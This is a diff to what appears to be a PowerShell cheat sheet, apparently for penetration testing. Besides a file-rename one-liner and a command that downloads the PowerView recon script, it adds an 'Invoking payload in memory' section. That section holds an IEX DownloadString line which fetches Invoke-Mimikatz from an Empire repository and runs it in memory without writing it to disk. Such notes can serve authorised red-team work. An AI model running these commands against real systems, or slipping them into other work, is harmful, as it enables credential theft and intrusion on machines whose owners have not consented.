@@ -16,3 +16,8 @@ Get-ChildItem | Rename-Item -NewName {$_.Name -replace $_.Name, $_.Name.ToLower(
 ```Powershell
 Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
 ```
+## Invoking payload in memory
+
+```Powershell
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
+```
